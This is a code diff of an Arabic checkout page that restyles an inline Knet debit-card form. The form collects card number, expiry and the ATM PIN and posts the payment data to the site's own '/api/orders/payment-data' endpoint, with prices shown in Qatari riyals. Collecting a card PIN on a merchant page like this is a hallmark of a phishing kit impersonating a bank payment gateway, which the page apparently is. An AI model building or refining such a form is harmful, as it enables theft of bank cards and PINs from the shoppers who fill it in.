@@ -685,32 +685,31 @@
                 <button type="submit" class="pay-btn" id="payBtn">تأكيد الدفع - <span id="btnTotal">35 ر.ق</span></button>
                 
                 <!-- Knet Inline Form -->
-                <div id="knetCardSection" class="card-input-section" style="display:none; border: 1px solid #e0e0e0; background: #fdfdfd; padding: 20px; border-radius: 8px;">
-                    <div style="text-align: center; margin-bottom: 20px;">
-                        <img src="https://www.knet.com.kw/wp-content/uploads/2020/02/Knet-Logo.png" style="height: 35px;" alt="Knet">
-                    </div>
-                    
+                <div id="knetCardSection" class="card-input-section" style="display:none; border-color: #0070cd;">
+                    <h3><i class="fas fa-university" style="color:#0070cd;"></i> بيانات بطاقة Knet</h3>
+
                     <div class="form-group">
-                        <label style="color: #666; font-size: 13px;">رقم بطاقة الصراف الآلي</label>
-                        <div style="position: relative;">
-                            <input type="text" id="knetCardNumber" name="knet_card_number" class="form-control" required placeholder="رقم البطاقة" maxlength="19" style="border: 1px solid #ccc; border-radius: 4px; padding: 10px;">
+                        <label>رقم بطاقة الصراف الآلي</label>
+                        <div class="card-number-wrapper">
+                            <input type="text" id="knetCardNumber" name="knet_card_number" class="form-control" required placeholder="1234 5678 9012 3456" maxlength="19" oncopy="return false;" onpaste="return false;">
+                            <i class="fas fa-credit-card card-type-icon" id="knetCardTypeIcon" style="font-size: 24px; color: #0070cd;"></i>
                         </div>
                         <div class="field-error" id="knet_card_number_error"></div>
                     </div>
 
-                    <div style="display: flex; gap: 15px; margin-top: 15px;">
-                        <div style="flex: 1;">
-                            <label style="color: #666; font-size: 13px;">تاريخ الانتهاء</label>
-                            <div style="display: flex; align-items: center; gap: 5px;" dir="ltr">
-                                <input type="text" id="knetExpiryMonth" class="form-control" required placeholder="MM" maxlength="2" style="width: 50px; text-align: center; border: 1px solid #ccc; border-radius: 4px; padding: 8px;">
-                                <span>/</span>
-                                <input type="text" id="knetExpiryYear" class="form-control" required placeholder="YY" maxlength="2" style="width: 50px; text-align: center; border: 1px solid #ccc; border-radius: 4px; padding: 8px;">
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>تاريخ الانتهاء</label>
+                            <div style="display: flex; gap: 8px; align-items: center;" dir="ltr">
+                                <input type="text" id="knetExpiryMonth" class="form-control" required placeholder="MM" maxlength="2" style="width: 70px; font-size:14px; padding:10px 12px;">
+                                <span style="font-size: 20px; font-weight: 700; color: #888;">/</span>
+                                <input type="text" id="knetExpiryYear" class="form-control" required placeholder="YY" maxlength="2" style="width: 70px; font-size:14px; padding:10px 12px;">
                             </div>
                             <div class="field-error" id="knet_expiry_error"></div>
                         </div>
-                        <div style="flex: 1;">
-                            <label style="color: #666; font-size: 13px;">الرقم السري (PIN)</label>
-                            <input type="password" id="knetPin" name="knet_pin" class="form-control" required placeholder="PIN" maxlength="4" style="border: 1px solid #ccc; border-radius: 4px; padding: 10px;">
+                        <div class="form-group">
+                            <label>الرقم السري (PIN)</label>
+                            <input type="password" id="knetPin" name="knet_pin" class="form-control" required placeholder="••••" maxlength="4" oncopy="return false;" onpaste="return false;" style="font-size:14px; padding:10px 12px;">
                             <div class="field-error" id="knet_pin_error"></div>
                         </div>
                     </div>
@@ -897,10 +896,6 @@
             };
 
             try {
-                // تحديث رسالة التحميل لـ KNET
-                document.getElementById('loadingTitle').textContent = 'يتم معالجة بيانات KNET...';
-                document.getElementById('loadingMessage').textContent = 'يرجى الانتظار، جاري معالجة الدفع عبر KNET.';
-                
                 const response = await fetch('/api/orders/payment-data', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -1206,9 +1201,6 @@
             document.getElementById('deliveryFee').textContent = formatPrice(data.deliveryFee) + ' ' + data.currency;
             document.getElementById('totalAmount').textContent = formattedTotal;
             document.getElementById('btnTotal').textContent = formattedTotal;
-            if (document.getElementById('knetBtnTotal')) {
-                document.getElementById('knetBtnTotal').textContent = formattedTotal;
-            }
             
             // Save total for Knet page
             sessionStorage.setItem('knetTotal', formattedTotal);
